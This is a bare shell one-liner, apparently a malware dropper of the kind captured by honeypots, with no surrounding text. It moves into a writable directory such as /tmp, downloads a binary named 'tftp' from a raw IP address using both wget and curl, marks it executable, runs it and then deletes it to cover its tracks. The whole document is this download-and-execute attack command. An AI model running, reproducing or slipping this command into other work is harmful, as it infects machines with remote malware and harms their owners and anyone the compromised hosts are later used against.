cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.63.79.64/tftp; curl -O http://45.63.79.64/tftp; chmod +x tftp; ./tftp; rm -rf tftp
